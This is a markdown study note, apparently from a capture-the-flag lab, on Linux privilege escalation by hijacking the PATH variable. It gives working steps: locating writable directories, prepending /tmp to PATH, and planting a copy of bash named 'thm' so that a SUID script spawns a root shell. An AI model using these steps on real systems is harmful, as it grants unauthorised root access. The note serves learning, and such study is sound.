# Privilege Escaltion - PATH

## **🔐 Privilege Escalation: PATH Environment Variable**

### **📌 Concept**

Linux uses the **PATH environment variable** to locate binaries for execution. If a writable folder exists in the $PATH, a user can potentially hijack execution by placing a **malicious script/binary** in that folder.

---

### **⚙️ Understanding**

### **PATH**

- $PATH is an **environment variable** that contains a list of directories separated by :.
- When a user types a command (e.g., ls, python), Linux searches through these directories **in order** to find the corresponding executable.
- Example:

```
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

---

### **🚩 Vulnerability Checkpoints**

Ask the following:

- ✅ What folders are listed under $PATH?
- ✅ Do any of these folders have **write permissions** for the current user?
- ✅ Can $PATH be **modified**?
- ✅ Is there a **SUID binary or script** that references an unqualified binary (e.g., just thm instead of /usr/bin/thm)?

---

### **💣 Exploiting the PATH**

1. A script (e.g., named path) is running with **SUID bit** set (i.e., with root privileges).
2. Inside the script:

```
#!/bin/bash
thm
```

1. The script relies on $PATH to locate the thm binary.

---

### **🛠 Exploit Steps**

1. **Check writable directories:**

```
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

**Identify if any writable folders are in $PATH:**

- If not, use:

```
export PATH=/tmp:$PATH
```

**Create a malicious binary:**

```
cp /bin/bash /tmp/thm
chmod +x /tmp/thm
```

**Run the vulnerable SUID script:**

```
./path
```

---

### **⚠️ Important Notes**

- The thm binary in /tmp will run **with root privileges** because the script has the SUID bit.
- This method only works if:
    - The script calls the binary **without an absolute path**.
    - The user can **modify $PATH**.
    - There’s a **writable folder** in or added to $PATH.

---

### **🧠 Pro Tips**

- **Always check $PATH** during privilege escalation.
- The /tmp directory is often your best shot — writable by everyone.
- **Don’t forget to clean up** malicious binaries after testing.

---